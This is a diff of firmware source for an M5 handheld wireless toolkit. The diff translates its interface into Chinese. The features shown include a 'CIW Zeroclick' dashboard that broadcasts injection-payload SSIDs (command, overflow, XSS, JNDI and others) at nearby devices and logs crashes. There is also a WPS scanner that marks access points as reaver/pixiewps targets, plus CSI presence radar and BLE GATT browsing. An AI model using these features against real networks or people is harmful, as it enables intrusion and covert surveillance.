-    M5.Display.println("No alerts recorded.");
+    M5.Display.println("暂无告警记录.");
   } else {
     int shown = min(ciwAlertCount, 4);
     for (int i = 0; i < shown; i++) {
@@ -38700,7 +38938,7 @@ void ciwViewAlerts() {
       M5.Display.println("  " + String(ciwAlerts[idx].durationMs) + "ms");
     }
     if (ciwAlertCount > shown) {
-      M5.Display.println("..." + String(ciwAlertCount - shown) + " more");
+      M5.Display.println("...还有 " + String(ciwAlertCount - shown) + " 条");
     }
   }
 
@@ -38725,15 +38963,15 @@ void ciwSetRotation() {
   while (true) {
     // Draw static header once
     M5.Display.clear();
-    M5.Display.setTextSize(1.5);
-    M5.Display.setTextFont(1);
+    evilSetCnFont(M5.Display, 1.5);
+    evilKeepCnFont(M5.Display);
     M5.Display.setCursor(5, 2);
     M5.Display.setTextColor(TFT_CYAN);
-    M5.Display.println("Rotation Interval (sec)");
+    M5.Display.println("轮换间隔 (秒)");
     M5.Display.setTextColor(menuTextUnFocusedColor);
     M5.Display.println();
-    M5.Display.println("Current: " + String(ciwRotationInterval / 1000) + "s");
-    M5.Display.println("Type value (1-3600) + ENTER");
+    M5.Display.println("当前: " + String(ciwRotationInterval / 1000) + "s");
+    M5.Display.println("输入数值 (1-3600) + 回车");
     M5.Display.println();
     M5.Display.setTextColor(TFT_GREEN);
     M5.Display.print("> " + input + "_");
@@ -38791,20 +39029,20 @@ void ciwZeroclickMenu() {
   while (true) {
     // Build option labels dynamically each iteration
     String labels[5];
-    labels[0] = "Select Categories";
-    labels[1] = ciwBroadcasting ? "[STOP] Attack" : "[START] Attack";
-    labels[2] = "View Devices (" + String(ciwDeviceCount) + ")";
-    labels[3] = "View Alerts (" + String(ciwAlertCount) + ")";
-    labels[4] = "Set Rotation (" + String(ciwRotationInterval / 1000) + "s)";
+    labels[0] = "选择测试分类";
+    labels[1] = ciwBroadcasting ? "[停止] 广播攻击" : "[启动] 广播攻击";
+    labels[2] = "查看设备 (" + String(ciwDeviceCount) + ")";
+    labels[3] = "查看告警 (" + String(ciwAlertCount) + ")";
+    labels[4] = "轮换间隔 (" + String(ciwRotationInterval / 1000) + "s)";
     const int optCount = 5;
 
     // Draw menu
     M5.Display.clear();
-    M5.Display.setTextSize(1.5);
-    M5.Display.setTextFont(1);
+    evilSetCnFont(M5.Display, 1.5);
+    evilKeepCnFont(M5.Display);
     M5.Display.setCursor(5, 0);
     M5.Display.setTextColor(TFT_CYAN);
-    M5.Display.println("CIW Zeroclick");
+    M5.Display.println("CIW 零点击注入");
     M5.Display.setTextColor(menuTextUnFocusedColor);
 
     for (int i = 0; i < optCount; i++) {
@@ -38864,9 +39102,9 @@ void ciwZeroclickMenu() {
 void handleCiwDashboard() {
   if (!guardAdmin()) return;
 
-  static const char CIW_HTML[] PROGMEM = R"HTML(<!doctype html><html lang=en>
+  static const char CIW_HTML[] PROGMEM = R"HTML(<!doctype html><html lang=zh-CN>
 <meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
-<title>CIW Zeroclick</title>
+<title>CIW 零点击注入</title>
 <style>
 :root{--bg:#0b1020;--card:rgba(255,255,255,.08);--txt:#e9eefc;--mut:#8892a6;--acc:#4c7dff;--grn:#22c55e;--red:#ef4444;--r:12px}
 *{box-sizing:border-box;margin:0}body{background:var(--bg);color:var(--txt);font-family:system-ui;padding:16px;max-width:700px;margin:auto}
@@ -38887,32 +39125,32 @@ button:hover{opacity:.85}button.stop{background:var(--red)}
 a.back{color:var(--acc);text-decoration:none;font-size:13px}
 </style>
 <body>
-<a class=back href=/evil-menu>&larr; Admin</a>
-<h1>CIW Zeroclick Dashboard</h1>
-<div class=card><h2>Categories</h2><div class=cats id=cats></div></div>
-<div class=card><h2>Control</h2><div class=row>
-<button onclick=deploy() id=startBtn>Start Broadcast</button>
-<button class=stop onclick=stop()>Stop</button></div>
-<div class=status id=status>Loading...</div></div>
-<div class=card><h2>Devices</h2><div id=devices></div></div>
-<div class=card><h2>Alerts</h2><div id=alerts></div></div>
+<a class=back href=/evil-menu>&larr; 返回后台</a>
+<h1>CIW 零点击注入面板</h1>
+<div class=card><h2>攻击载荷分类</h2><div class=cats id=cats></div></div>
+<div class=card><h2>广播控制</h2><div class=row>
+<button onclick=deploy() id=startBtn>开始广播</button>
+<button class=stop onclick=stop()>停止</button></div>
+<div class=status id=status>加载中...</div></div>
+<div class=card><h2>已连接设备</h2><div id=devices></div></div>
+<div class=card><h2>崩溃告警</h2><div id=alerts></div></div>
 <script>
 const cats=["wifi_cmd","wifi_overflow","wifi_fmt","wifi_probe","wifi_esc","wifi_serial","wifi_enc","wifi_chain","wifi_heap","wifi_xss","wifi_path","wifi_crlf","wifi_jndi","wifi_nosql"];
 let sel=new Set(cats);
 const ce=document.getElementById("cats");
 cats.forEach(c=>{const d=document.createElement("div");d.className="cat on";d.textContent=c.replace("wifi_","");d.onclick=()=>{sel.has(c)?sel.delete(c):sel.add(c);d.className="cat"+(sel.has(c)?" on":"")};ce.appendChild(d)});
-function deploy(){fetch("/api/ciw/deploy",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"cats="+[...sel].join(",")}).then(r=>r.json()).then(d=>{if(d.ok)poll();else alert(d.error||"Failed")})}
-function stop(){fetch("/api/ciw/stop",{method:"POST"}).then(r=>r.json())}
-function poll(){
+const deploy = function(){fetch("/api/ciw/deploy",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"cats="+[...sel].join(",")}).then(r=>r.json()).then(d=>{if(d.ok)poll();else alert(d.error||"启动失败")})};
+const stop = function(){fetch("/api/ciw/stop",{method:"POST"}).then(r=>r.json())};
+const poll = function(){
 fetch("/api/ciw/status").then(r=>r.json()).then(d=>{
 const s=document.getElementById("status");
-if(d.broadcasting){s.innerHTML='<span class=live>BROADCASTING</span> | SSID: '+esc(d.ssid)+' | '+d.index+'/'+d.total+' | Devices: '+d.devices+' | Alerts: '+d.alerts;document.getElementById("startBtn").textContent="Broadcasting..."}
-else{s.innerHTML='<span class=off>STOPPED</span> | Devices: '+d.devices+' | Alerts: '+d.alerts;document.getElementById("startBtn").textContent="Start Broadcast"}
+if(d.broadcasting){s.innerHTML='<span class=live>正在广播</span> | SSID: '+esc(d.ssid)+' | '+d.index+'/'+d.total+' | 设备: '+d.devices+' | 告警: '+d.alerts;document.getElementById("startBtn").textContent="广播中..."}
+else{s.innerHTML='<span class=off>已停止</span> | 设备: '+d.devices+' | 告警: '+d.alerts;document.getElementById("startBtn").textContent="开始广播"}
 });
-fetch("/api/ciw/devices").then(r=>r.json()).then(d=>{const el=document.getElementById("devices");el.innerHTML=d.length?d.map(x=>'<div class=dev-item>'+esc(x.mac)+' | '+esc(x.ssid)+'</div>').join(""):"<div style='color:var(--mut);font-size:13px'>No devices</div>"});
-fetch("/api/ciw/alerts").then(r=>r.json()).then(d=>{const el=document.getElementById("alerts");el.innerHTML=d.length?d.map(x=>'<div class=alert-item>'+esc(x.mac)+' | '+esc(x.ssid)+' | '+x.duration+'ms</div>').join(""):"<div style='color:var(--mut);font-size:13px'>No alerts</div>"});
-}
-function esc(s){const d=document.createElement("div");d.textContent=s;return d.innerHTML}
+fetch("/api/ciw/devices").then(r=>r.json()).then(d=>{const el=document.getElementById("devices");el.innerHTML=d.length?d.map(x=>'<div class=dev-item>'+esc(x.mac)+' | '+esc(x.ssid)+'</div>').join(""):"<div style='color:var(--mut);font-size:13px'>暂无设备</div>"});
+fetch("/api/ciw/alerts").then(r=>r.json()).then(d=>{const el=document.getElementById("alerts");el.innerHTML=d.length?d.map(x=>'<div class=alert-item>'+esc(x.mac)+' | '+esc(x.ssid)+' | '+x.duration+'ms</div>').join(""):"<div style='color:var(--mut);font-size:13px'>暂无告警</div>"});
+};
+const esc = function(s){const d=document.createElement("div");d.textContent=s;return d.innerHTML};
 poll();setInterval(poll,2000);
 </script></body></html>)HTML";
 
@@ -39382,7 +39620,7 @@ void csiRadarLoop(const char* mode_label, bool multi_beacon) {
     bool has_signal = false;
     float current_turb = 0.0f;
     float current_var = 0.0f;
-    const char* status_text = "CALIBRATING";
+    const char* status_text = "校准中";
     float turb_max_display = 1.0f;
 
     M5.Display.clear(TFT_BLACK);
@@ -39402,7 +39640,7 @@ void csiRadarLoop(const char* mode_label, bool multi_beacon) {
                 csi_hampel_idx = 0; csi_hampel_count = 0;
                 csi_mv_idx = 0; csi_mv_count = 0;
                 csi_lowpass_init();
-                csi_threshold = 0; status_text = "CALIBRATING"; last_key_time = now;
+                csi_threshold = 0; status_text = "校准中"; last_key_time = now;
             }
         }
 
@@ -39449,12 +39687,12 @@ void csiRadarLoop(const char* mode_label, bool multi_beacon) {
                     if (csi_threshold < 1e-6f) csi_threshold = 1e-6f;
                     csi_calibrated = true;
                 }
-                status_text = "CALIBRATING";
+                status_text = "校准中";
             } else {
                 float thr = csi_threshold * csi_sensitivity;
-                if (current_var > thr * 3.0f) status_text = "PRESENCE";
-                else if (current_var > thr) status_text = "MOTION";
-                else status_text = "IDLE";
+                if (current_var > thr * 3.0f) status_text = "有人";
+                else if (current_var > thr) status_text = "移动";
+                else status_text = "静止";
             }
 
             // Auto-scale display
@@ -39471,7 +39709,7 @@ void csiRadarLoop(const char* mode_label, bool multi_beacon) {
             if (csi_breath_count < CSI_BREATH_BUF) csi_breath_count++;
 
             if (csi_breath_count > CSI_BREATH_BUF * 4 / 5 && now - csi_breath_last_update > 2000) {
-                if (strcmp(status_text, "IDLE") == 0) {
+                if (strcmp(status_text, "静止") == 0) {
                     float lin[CSI_BREATH_BUF];
                     for (int i = 0; i < csi_breath_count; i++) {
                         int ri = (csi_breath_idx - csi_breath_count + i + CSI_BREATH_BUF) % CSI_BREATH_BUF;
@@ -39494,8 +39732,8 @@ void csiRadarLoop(const char* mode_label, bool multi_beacon) {
         else sp.fillScreen(TFT_BLACK);
 
         // Top bar
-        sp.setTextSize(1);
-        sp.setTextFont(1);
+        evilSetCnFont(sp, 1);
+        evilKeepCnFont(sp);
         sp.setTextColor(TFT_GREEN, TFT_BLACK);
         sp.setCursor(2, 2);
         sp.printf("CSI [%s] CV", mode_label);
@@ -39592,12 +39830,12 @@ void csiRadarLoop(const char* mode_label, bool multi_beacon) {
         sp.setCursor(3, H - BOT_H + 2);
         if (!has_signal) {
             sp.setTextColor(TFT_YELLOW, bar_bg);
-            sp.print("WAITING");
+            sp.print("等待信号");
         } else {
             uint16_t sc = TFT_GREEN;
-            if (strcmp(status_text, "MOTION") == 0) sc = TFT_YELLOW;
-            else if (strcmp(status_text, "PRESENCE") == 0) sc = TFT_RED;
-            else if (strcmp(status_text, "CALIBRATING") == 0) sc = TFT_CYAN;
+            if (strcmp(status_text, "移动") == 0) sc = TFT_YELLOW;
+            else if (strcmp(status_text, "有人") == 0) sc = TFT_RED;
+            else if (strcmp(status_text, "校准中") == 0) sc = TFT_CYAN;
             sp.setTextColor(sc, bar_bg);
             sp.print(status_text);
         }
@@ -39614,7 +39852,7 @@ void csiRadarLoop(const char* mode_label, bool multi_beacon) {
         }
         sp.setCursor(3, H - BOT_H + 10);
         sp.setTextColor(sp.color565(0, 60, 0), bar_bg);
-        sp.print("+/-=sens R=cal BACK=exit");
+        sp.print("+/-=灵敏 R=校准 BACK=退出");
 
         if (use_sprite) csi_sprite->pushSprite(0, 0);
         else { M5.Display.endWrite(); M5.Display.display(); }
@@ -39637,30 +39875,30 @@ void csiRadarMenu() {
     const int W = 240, H = 135;
 
     M5.Display.clear(TFT_BLACK);
-    M5.Display.setTextSize(1);
-    M5.Display.setTextFont(1);
+    evilSetCnFont(M5.Display, 1);
+    evilKeepCnFont(M5.Display);
     M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
     M5.Display.setCursor(55, 4);
-    M5.Display.print("CSI RADAR - Select Mode");
+    M5.Display.print("CSI 雷达 - 选择模式");
     M5.Display.drawLine(0, 16, W, 16, M5.Display.color565(0, 40, 0));
 
     M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
     M5.Display.setCursor(8, 28);
-    M5.Display.print("1. Single Beacon");
+    M5.Display.print("1. 单信标模式");
     M5.Display.setTextColor(TFT_DARKGREEN, TFT_BLACK);
     M5.Display.setCursor(16, 40);
-    M5.Display.print("1 ESP32 as CSI-Beacon AP");
+    M5.Display.print("1台 ESP32 作为 CSI-Beacon 热点");
 
     M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
     M5.Display.setCursor(8, 60);
-    M5.Display.print("2. Multi Beacons");
+    M5.Display.print("2. 多信标模式");
     M5.Display.setTextColor(TFT_DARKGREEN, TFT_BLACK);
     M5.Display.setCursor(16, 72);
-    M5.Display.print("2+ ESP32 beacons, better");
+    M5.Display.print("2台以上 ESP32 信标, 效果更佳");
 
     M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
     M5.Display.setCursor(8, 100);
-    M5.Display.print("Press 1 or 2  |  BACK=exit");
+    M5.Display.print("按 1 或 2  |  BACK=退出");
     M5.Display.display();
 
     int mode = 0;
@@ -39678,10 +39916,10 @@ void csiRadarMenu() {
         M5.Display.clear(TFT_BLACK);
         M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
         M5.Display.setCursor(10, 20);
-        M5.Display.print("Multi-Beacon ESP-NOW mode");
+        M5.Display.print("多信标 ESP-NOW 模式");
         M5.Display.setCursor(10, 40);
         M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
-        M5.Display.print("Discovering beacons...");
+        M5.Display.print("正在发现信标...");
         M5.Display.display();
 
         // Espressif exact config: STA, HT40, ch11, no power save
@@ -39695,7 +39933,7 @@ void csiRadarMenu() {
         if (esp_now_init() != ESP_OK) {
             M5.Display.setCursor(10, 60);
             M5.Display.setTextColor(TFT_RED, TFT_BLACK);
-            M5.Display.print("ESP-NOW init failed!");
+            M5.Display.print("ESP-NOW 初始化失败!");
             M5.Display.display(); delay(2000);
             esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
             WiFi.mode(WIFI_OFF); inMenu = true; return;
@@ -39741,10 +39979,10 @@ void csiRadarMenu() {
             M5.Display.fillRect(10, 55, 220, 30, TFT_BLACK);
             M5.Display.setTextColor(csi_known_count > 0 ? TFT_GREEN : TFT_YELLOW, TFT_BLACK);
             M5.Display.setCursor(10, 55);
-            M5.Display.printf("Beacons found: %d  F:%lu", csi_known_count, csi_frame_count);
+            M5.Display.printf("已发现信标: %d  F:%lu", csi_known_count, csi_frame_count);
             M5.Display.setTextColor(TFT_DARKGREEN, TFT_BLACK);
             M5.Display.setCursor(10, 70);
-            M5.Display.print("ENTER=start  BACK=exit");
+            M5.Display.print("ENTER=开始  BACK=退出");
             M5.Display.display();
             if (kp(KEY_ENTER) && csi_known_count > 0) break;
             delay(200);
@@ -39754,7 +39992,7 @@ void csiRadarMenu() {
             M5.Display.fillRect(10, 85, 220, 12, TFT_BLACK);
             M5.Display.setTextColor(TFT_RED, TFT_BLACK);
             M5.Display.setCursor(10, 85);
-            M5.Display.print("No beacons! Flash CSI-Beacon");
+            M5.Display.print("未发现信标! 请刷入 CSI-Beacon");
             M5.Display.display(); delay(2000);
             esp_now_deinit(); esp_wifi_set_csi(false);
             esp_wifi_set_promiscuous(false);
@@ -39765,11 +40003,11 @@ void csiRadarMenu() {
         M5.Display.clear(TFT_BLACK);
         M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
         M5.Display.setCursor(10, 50);
-        M5.Display.printf("%d beacon(s) found, starting...", csi_known_count);
+        M5.Display.printf("发现 %d 个信标, 正在启动...", csi_known_count);
         M5.Display.display();
         delay(500);
 
-        csiRadarLoop("MULTI", true);
+        csiRadarLoop("多信标", true);
 
         esp_now_deinit();
         esp_wifi_set_promiscuous(false);
@@ -39779,7 +40017,7 @@ void csiRadarMenu() {
         M5.Display.clear(TFT_BLACK);
         M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
         M5.Display.setCursor(10, 20);
-        M5.Display.print("Scanning for CSI-Beacon...");
+        M5.Display.print("正在扫描 CSI-Beacon...");
         M5.Display.display();
 
         WiFi.mode(WIFI_STA);
@@ -39797,15 +40035,15 @@ void csiRadarMenu() {
         if (beacon_found == 0) {
             M5.Display.setCursor(10, 40);
             M5.Display.setTextColor(TFT_RED, TFT_BLACK);
-            M5.Display.print("No CSI-Beacon found!");
+            M5.Display.print("未找到 CSI-Beacon!");
             M5.Display.setCursor(10, 58);
             M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
-            M5.Display.print("Flash CSI-Beacon firmware");
+            M5.Display.print("请在任意 ESP32 (C3/C6/S3)");
             M5.Display.setCursor(10, 70);
-            M5.Display.print("on any ESP32 (C3/C6/S3)");
+            M5.Display.print("刷入 CSI-Beacon 固件");
             M5.Display.setCursor(10, 90);
             M5.Display.setTextColor(TFT_DARKGREEN, TFT_BLACK);
-            M5.Display.print("BACK=exit  ENTER=retry");
+            M5.Display.print("BACK=退出  ENTER=重试");
             M5.Display.display();
             while (true) {
                 M5.update(); cardUpdate();
@@ -39829,9 +40067,9 @@ void csiRadarMenu() {
         M5.Display.clear(TFT_BLACK);
         M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
         M5.Display.setCursor(10, 30);
-        M5.Display.printf("Found %d beacon(s)", beacon_found);
+        M5.Display.printf("发现 %d 个信标", beacon_found);
         M5.Display.setCursor(10, 50);
-        M5.Display.printf("Connecting: %s", beaconSSID.c_str());
+        M5.Display.printf("正在连接: %s", beaconSSID.c_str());
         M5.Display.display();
 
         WiFi.begin(beaconSSID.c_str());
@@ -39844,14 +40082,14 @@ void csiRadarMenu() {
         if (WiFi.status() != WL_CONNECTED) {
             M5.Display.setTextColor(TFT_RED, TFT_BLACK);
             M5.Display.setCursor(10, 70);
-            M5.Display.print("Connection FAILED!");
+            M5.Display.print("连接失败!");
             M5.Display.display(); delay(2000);
             esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
             WiFi.disconnect(); WiFi.mode(WIFI_OFF); inMenu = true; return;
         }
 
         M5.Display.setCursor(10, 70);
-        M5.Display.printf("Connected! IP:%s", WiFi.localIP().toString().c_str());
+        M5.Display.printf("已连接! IP:%s", WiFi.localIP().toString().c_str());
         M5.Display.display();
         delay(500);
 
@@ -39867,7 +40105,7 @@ void csiRadarMenu() {
         esp_wifi_set_csi_rx_cb(csi_rx_callback, NULL);
         esp_wifi_set_csi(true);
 
-        csiRadarLoop(mode == 2 ? "MULTI" : "BEACON", false);
+        csiRadarLoop(mode == 2 ? "多信标" : "单信标", false);
     }
 
     M5.Display.clear(menuBackgroundColor);
@@ -39998,10 +40236,10 @@ void wpsa_draw(M5Canvas* sprite, bool use_sprite, int sel, int top, uint8_t ch) 
   sp.fillScreen(TFT_BLACK);
   sp.fillRect(0, 0, W, 16, 0x0841);
   sp.drawFastHLine(0, 16, W, orange);
-  sp.setTextFont(1); sp.setTextSize(1.5);
+  evilKeepCnFont(sp); evilSetCnFont(sp, 1.5);
   sp.setTextColor(orange, 0x0841);
-  sp.setCursor(4, 2); sp.printf("WPS Auditor  ch%-2d  %d", ch, cnt);
-  sp.setTextSize(1);
+  sp.setCursor(4, 2); sp.printf("WPS 审计  信道%-2d  %d", ch, cnt);
+  evilSetCnFont(sp, 1);
 
   int y = 20; const int maxVis = 8;
   for (int oi = top; oi < cnt && oi < top + maxVis; oi++) {
@@ -40013,17 +40251,17 @@ void wpsa_draw(M5Canvas* sprite, bool use_sprite, int sel, int top, uint8_t ch) 
     sp.setTextColor(sel_ ? TFT_WHITE : fg);
     sp.setCursor(2, y + 2);
     sp.printf("%02X%02X%02X %-9.9s c%-2d%4d %s",
-              a.bssid[3], a.bssid[4], a.bssid[5], a.ssid[0] ? a.ssid : "(hidden)",
-              a.channel, a.rssi, a.wps1only ? "LIKELY" : "OPEN");
+              a.bssid[3], a.bssid[4], a.bssid[5], a.ssid[0] ? a.ssid : "(隐藏)",
+              a.channel, a.rssi, a.wps1only ? "高危" : "开启");
     y += 12;
   }
   if (cnt == 0) {
     sp.setTextColor(TFT_YELLOW); sp.setCursor(10, 60);
-    sp.print("Scanning WPS APs (ch hop)...");
+    sp.print("正在扫描 WPS 热点(跳频)...");
   }
   sp.fillRect(0, H - 12, W, 12, 0x0841);
   sp.setTextColor(0x5AEB); sp.setCursor(2, H - 10);
-  sp.print("ENTER=detail  RED=OPEN ORANGE=WPS1.0  BKSP=exit");
+  sp.print("ENTER=详情 红=开启 橙=WPS1.0 BKSP=退出");
   if (use_sprite) sprite->pushSprite(0, 0);
 }
 
@@ -40036,18 +40274,18 @@ void wpsa_detail(M5Canvas* sprite, bool use_sprite, int sel) {
   LovyanGFX& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
   uint16_t orange = sp.color565(255, 140, 0);
   sp.fillScreen(TFT_BLACK);
-  sp.setTextFont(1); sp.setTextSize(1.5);
+  evilKeepCnFont(sp); evilSetCnFont(sp, 1.5);
   sp.setTextColor(a.wps1only ? orange : TFT_RED);
-  sp.setCursor(4, 2); sp.print(a.wps1only ? "LIKELY (WPS1.0)" : "OPEN (WPS-PIN)");
-  sp.setTextSize(1); sp.setTextColor(TFT_WHITE);
+  sp.setCursor(4, 2); sp.print(a.wps1only ? "极易受攻击 (WPS1.0)" : "已开启 (WPS-PIN)");
+  evilSetCnFont(sp, 1); sp.setTextColor(TFT_WHITE);
   int y = 24;
-  sp.setCursor(4, y); sp.printf("SSID : %s", a.ssid[0] ? a.ssid : "(hidden)"); y += 14;
+  sp.setCursor(4, y); sp.printf("SSID : %s", a.ssid[0] ? a.ssid : "(隐藏)"); y += 14;
   sp.setCursor(4, y); sp.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
       a.bssid[0],a.bssid[1],a.bssid[2],a.bssid[3],a.bssid[4],a.bssid[5]); y += 14;
-  sp.setCursor(4, y); sp.printf("Channel : %d", a.channel); y += 14;
-  sp.setCursor(4, y); sp.printf("RSSI : %d dBm", a.rssi); y += 14;
-  sp.setCursor(4, y); sp.printf("WPS : %s, PIN confirme", a.wps1only ? "1.0" : "2.0"); y += 14;
-  sp.setTextColor(0x5AEB); sp.setCursor(4, 122); sp.print("Cible reaver/pixiewps = BSSID  BKSP=back");
+  sp.setCursor(4, y); sp.printf("信道 : %d", a.channel); y += 14;
+  sp.setCursor(4, y); sp.printf("信号 : %d dBm", a.rssi); y += 14;
+  sp.setCursor(4, y); sp.printf("WPS  : %s, 已确认支持 PIN", a.wps1only ? "1.0" : "2.0"); y += 14;
+  sp.setTextColor(0x5AEB); sp.setCursor(4, 122); sp.print("reaver/pixiewps 目标=BSSID  BKSP=返回");
   if (use_sprite) sprite->pushSprite(0, 0);
   enterDebounce();
   while (true) { M5.update(); cardUpdate(); if (kp(KEY_BACKSPACE) || kp(KEY_ENTER)) { keyRelease(); break; } delay(15); }
@@ -40103,7 +40341,7 @@ void wpsAuditorMenu() {
   esp_wifi_set_promiscuous_rx_cb(NULL);
   WiFi.mode(WIFI_OFF);
   if (sprite) { sprite->deleteSprite(); delete sprite; }
-  waitAndReturnToMenu("WPS Auditor stopped");
+  waitAndReturnToMenu("WPS 审计已停止");
 }
 // =================== WPS Auditor end ================================
 
@@ -40239,10 +40477,10 @@ void bcn_draw(M5Canvas* sprite, bool use_sprite, int sel, int top) {
   sp.fillScreen(TFT_BLACK);
   sp.fillRect(0, 0, W, 16, 0x0841);
   sp.drawFastHLine(0, 16, W, cyan);
-  sp.setTextFont(1); sp.setTextSize(1.5);
+  evilKeepCnFont(sp); evilSetCnFont(sp, 1.5);
   sp.setTextColor(cyan, 0x0841);
-  sp.setCursor(4, 2); sp.printf("Beacon Scan  %d", cnt);
-  sp.setTextSize(1);
+  sp.setCursor(4, 2); sp.printf("信标扫描  %d", cnt);
+  evilSetCnFont(sp, 1);
 
   int y = 20; const int maxVis = 9;
   for (int oi = top; oi < cnt && oi < top + maxVis; oi++) {
@@ -40267,10 +40505,10 @@ void bcn_draw(M5Canvas* sprite, bool use_sprite, int sel, int top) {
     sp.printf("%s %4d %s", bcn_type_str(b.type), b.rssi, info);
     y += 12;
   }
-  if (cnt == 0) { sp.setTextColor(TFT_YELLOW); sp.setCursor(10, 60); sp.print("Scanning beacons..."); }
+  if (cnt == 0) { sp.setTextColor(TFT_YELLOW); sp.setCursor(10, 60); sp.print("正在扫描蓝牙信标..."); }
   sp.fillRect(0, H - 12, W, 12, 0x0841);
   sp.setTextColor(0x5AEB); sp.setCursor(2, H - 10);
-  sp.print("ENTER=detail  ;/. select  BKSP=exit");
+  sp.print("ENTER=详情  ;/. 选择  BKSP=退出");
   if (use_sprite) sprite->pushSprite(0, 0);
 }
 
@@ -40283,9 +40521,9 @@ void bcn_detail(M5Canvas* sprite, bool use_sprite, int sel) {
   LovyanGFX& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
   uint16_t cyan = sp.color565(0, 200, 220);
   sp.fillScreen(TFT_BLACK);
-  sp.setTextFont(1); sp.setTextSize(1.5); sp.setTextColor(cyan);
-  sp.setCursor(4, 2); sp.printf("%s beacon", bcn_type_str(b.type));
-  sp.setTextSize(1); sp.setTextColor(TFT_WHITE);
+  evilKeepCnFont(sp); evilSetCnFont(sp, 1.5); sp.setTextColor(cyan);
+  sp.setCursor(4, 2); sp.printf("%s 信标", bcn_type_str(b.type));
+  evilSetCnFont(sp, 1); sp.setTextColor(TFT_WHITE);
   int y = 22;
   sp.setCursor(4, y); sp.printf("MAC %02X:%02X:%02X:%02X:%02X:%02X  %ddBm",
       b.mac[0],b.mac[1],b.mac[2],b.mac[3],b.mac[4],b.mac[5], b.rssi); y += 13;
@@ -40299,22 +40537,22 @@ void bcn_detail(M5Canvas* sprite, bool use_sprite, int sel) {
     sp.setCursor(4, y); sp.print("URL:"); y += 11;
     sp.setCursor(8, y); sp.printf("%.36s", b.url);
   } else if (b.type == BCN_UID) {
-    sp.setCursor(4, y); sp.print("Namespace:"); y += 11;
+    sp.setCursor(4, y); sp.print("命名空间 (Namespace):"); y += 11;
     char ns[24]; for (int i=0;i<10;i++) snprintf(ns+i*2,3,"%02X",b.ns[i]);
     sp.setCursor(8, y); sp.printf("%s", ns); y += 13;
-    sp.setCursor(4, y); sp.print("Instance:"); y += 11;
+    sp.setCursor(4, y); sp.print("实例 (Instance):"); y += 11;
     char in[16]; for (int i=0;i<6;i++) snprintf(in+i*2,3,"%02X",b.inst[i]);
     sp.setCursor(8, y); sp.printf("%s", in);
   } else if (b.type == BCN_TLM) {
-    sp.setCursor(4, y); sp.printf("Battery: %u mV", b.battmv); y += 13;
-    sp.setCursor(4, y); sp.printf("Temp: %.1f C", b.tempC); y += 13;
-    sp.setCursor(4, y); sp.printf("Adv count: %lu", (unsigned long)b.advcnt);
+    sp.setCursor(4, y); sp.printf("电池电压: %u mV", b.battmv); y += 13;
+    sp.setCursor(4, y); sp.printf("温度: %.1f C", b.tempC); y += 13;
+    sp.setCursor(4, y); sp.printf("广播计数: %lu", (unsigned long)b.advcnt);
   } else {
-    sp.setCursor(4, y); sp.print("Ephemeral ID (rotating):"); y += 11;
+    sp.setCursor(4, y); sp.print("临时 ID (轮换):"); y += 11;
     char in[16]; for (int i=0;i<6;i++) snprintf(in+i*2,3,"%02X",b.inst[i]);
     sp.setCursor(8, y); sp.printf("%s", in);
   }
-  sp.setTextColor(0x5AEB); sp.setCursor(4, 124); sp.print("BKSP=back");
+  sp.setTextColor(0x5AEB); sp.setCursor(4, 124); sp.print("BKSP=返回");
   if (use_sprite) sprite->pushSprite(0, 0);
   enterDebounce();
   while (true) { M5.update(); cardUpdate(); if (kp(KEY_BACKSPACE) || kp(KEY_ENTER)) { keyRelease(); break; } delay(15); }
@@ -40451,8 +40689,8 @@ void bleGattExplorerMenu() {
   while (true) {   // ── SCAN ──
     g_gatt_devs.clear();
     sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-    sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("BLE GATT Explorer");
-    sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(8, 56); sp.print("Scanning BLE...");
+    sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("BLE GATT 浏览器");
+    sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(8, 56); sp.print("正在扫描 BLE...");
     push();
     BLEScan* scan = BLEDevice::getScan();
     scan->setAdvertisedDeviceCallbacks(&scb, true);
@@ -40467,8 +40705,8 @@ void bleGattExplorerMenu() {
         int lineH = 14, listY = 16, maxVis = (H - listY - 14) / lineH;
         if (sel < top) top = sel; if (sel >= top + maxVis) top = sel - maxVis + 1;
         sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-        sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.printf("BLE devices (%d)", (int)g_gatt_devs.size());
-        if (g_gatt_devs.empty()) { sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(8, 56); sp.print("none - R=rescan"); }
+        sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.printf("BLE 设备 (%d)", (int)g_gatt_devs.size());
+        if (g_gatt_devs.empty()) { sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(8, 56); sp.print("无设备 - R=重扫"); }
         for (int i = 0; i < maxVis && (top + i) < (int)g_gatt_devs.size(); i++) {
           int idx = top + i, y = listY + i * lineH; GattDev& d = g_gatt_devs[idx];
